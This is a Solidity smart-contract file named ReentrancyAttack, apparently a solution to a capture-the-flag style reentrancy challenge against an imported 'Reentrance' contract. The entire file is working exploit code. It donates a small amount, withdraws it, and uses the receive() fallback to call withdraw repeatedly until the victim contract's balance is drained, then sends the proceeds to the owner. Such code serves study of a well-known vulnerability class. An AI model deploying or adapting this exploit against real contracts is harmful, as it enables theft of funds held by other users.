// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Reentrance} from "./Reentrancy.sol";

contract ReentrancyAttack {
    Reentrance victim;
    address owner;
    constructor(address _v) payable{
        victim = Reentrance(payable(_v));
        owner = msg.sender;
        
    }                 

    function totalynotsus() external {
        require(msg.sender == owner);
        victim.donate{value: 1000000000000000}(address(this));
        victim.withdraw(1000000000000000);
    }

    receive() external payable{
        if(address(victim).balance != 0) {
            victim.withdraw(1000000000000000);
        }
        else{
            owner.call{value: address(this).balance}("");
        }
    }
}